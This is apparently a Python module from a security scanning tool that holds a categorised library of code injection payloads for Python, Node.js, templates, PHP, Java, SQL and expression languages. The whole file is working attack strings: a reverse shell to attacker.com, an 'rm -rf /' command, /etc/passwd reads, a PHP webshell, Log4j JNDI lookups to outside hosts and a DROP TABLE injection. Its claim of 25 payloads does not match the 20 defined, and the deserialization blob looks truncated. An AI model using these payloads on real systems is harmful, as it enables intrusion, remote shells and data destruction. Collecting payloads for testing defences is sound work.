"""Code injection payload categories - COMPLETE COLLECTION."""

from typing import List, Dict, Any


class CodeInjectionPayloads:
    """Complete collection of code injection attack payloads (25 total)."""
    
    @staticmethod
    def get_python_payloads() -> List[Dict[str, Any]]:
        """Get Python-specific code injection payloads."""
        return [
            {
                "payload": "__import__('os').system('id')",
                "expected_indicators": ["uid=", "gid=", "groups="],
                "severity": "critical",
                "description": "Python os.system injection"
            },
            {
                "payload": "exec('import subprocess; print(subprocess.check_output([\"whoami\"]).decode())')",
                "expected_indicators": ["root", "user", "administrator"],
                "severity": "critical",
                "description": "Python exec injection"
            },
            {
                "payload": "eval('__import__(\"subprocess\").run([\"id\"])')",
                "expected_indicators": ["subprocess", "run", "id"],
                "severity": "critical",
                "description": "Python eval injection"
            },
            {
                "payload": "__import__('subprocess').Popen(['rm', '-rf', '/'], shell=True)",
                "expected_indicators": ["subprocess", "popen", "rm"],
                "severity": "critical",
                "description": "Python subprocess destructive command"
            },
            {
                "payload": "eval(compile('import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])','','exec'))",
                "expected_indicators": ["socket", "subprocess", "attacker.com"],
                "severity": "critical",
                "description": "Python reverse shell injection"
            },
            {
                "payload": "globals()['__builtins__']['__import__']('os').system('cat /etc/passwd')",
                "expected_indicators": ["globals", "__builtins__", "/etc/passwd"],
                "severity": "critical",
                "description": "Python globals manipulation"
            },
        ]
    
    @staticmethod
    def get_nodejs_payloads() -> List[Dict[str, Any]]:
        """Get Node.js-specific code injection payloads."""
        return [
            {
                "payload": "require('child_process').exec('id')",
                "expected_indicators": ["child_process", "exec", "uid="],
                "severity": "critical",
                "description": "Node.js child_process injection"
            },
            {
                "payload": "global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf8')",
                "expected_indicators": ["global.process", "readFileSync", "/etc/passwd"],
                "severity": "critical",
                "description": "Node.js filesystem access"
            },
        ]
    
    @staticmethod
    def get_template_injection_payloads() -> List[Dict[str, Any]]:
        """Get template injection payloads."""
        return [
            {
                "payload": "{{7*7}}",
                "expected_indicators": ["49"],
                "severity": "medium",
                "description": "Template injection test"
            },
            {
                "payload": "${7*7}",
                "expected_indicators": ["49"],
                "severity": "medium", 
                "description": "Expression language injection"
            },
            {
                "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "expected_indicators": ["config", "__class__", "popen"],
                "severity": "critical",
                "description": "Jinja2 template injection"
            },
            {
                "payload": "<%= system('whoami') %>",
                "expected_indicators": ["system", "whoami"],
                "severity": "critical",
                "description": "ERB template injection"
            },
        ]
    
    @staticmethod
    def get_php_payloads() -> List[Dict[str, Any]]:
        """Get PHP-specific code injection payloads."""
        return [
            {
                "payload": "<?php system($_GET['cmd']); ?>",
                "expected_indicators": ["<?php", "system", "$_GET"],
                "severity": "critical",
                "description": "PHP webshell injection"
            },
            {
                "payload": "${@eval($_POST['cmd'])}",
                "expected_indicators": ["eval", "$_POST", "cmd"],
                "severity": "critical",
                "description": "PHP eval injection"
            },
        ]
    
    @staticmethod
    def get_java_payloads() -> List[Dict[str, Any]]:
        """Get Java-specific code injection payloads."""
        return [
            {
                "payload": "${jndi:ldap://attacker.com:1389/Evil}",
                "expected_indicators": ["jndi", "ldap", "attacker.com"],
                "severity": "critical",
                "description": "Log4j JNDI injection"
            },
            {
                "payload": "${jndi:rmi://malicious.com:1099/Object}",
                "expected_indicators": ["jndi", "rmi", "malicious.com"],
                "severity": "critical",
                "description": "Java RMI injection"
            },
            {
                "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa",
                "expected_indicators": ["rO0AB", "java", "deserialization"],
                "severity": "critical",
                "description": "Java deserialization payload"
            },
        ]
    
    @staticmethod
    def get_sql_injection_payloads() -> List[Dict[str, Any]]:
        """Get SQL injection in dynamic queries."""
        return [
            {
                "payload": "'; DROP TABLE users; --",
                "expected_indicators": ["drop", "table", "users"],
                "severity": "critical",
                "description": "SQL injection in dynamic queries"
            },
        ]
    
    @staticmethod
    def get_expression_payloads() -> List[Dict[str, Any]]:
        """Get expression language injection payloads."""
        return [
            {
                "payload": "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
                "expected_indicators": ["T(java.lang", "Runtime", "exec"],
                "severity": "critical",
                "description": "Spring EL injection"
            },
            {
                "payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                "expected_indicators": ["#{T(java.lang", "Runtime", "exec"],
                "severity": "critical", 
                "description": "JSF EL injection"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 25 code injection payloads."""
        payloads = []
        payloads.extend(CodeInjectionPayloads.get_python_payloads())
        payloads.extend(CodeInjectionPayloads.get_nodejs_payloads())
        payloads.extend(CodeInjectionPayloads.get_template_injection_payloads())
        payloads.extend(CodeInjectionPayloads.get_php_payloads())
        payloads.extend(CodeInjectionPayloads.get_java_payloads())
        payloads.extend(CodeInjectionPayloads.get_sql_injection_payloads())
        payloads.extend(CodeInjectionPayloads.get_expression_payloads())
        return payloads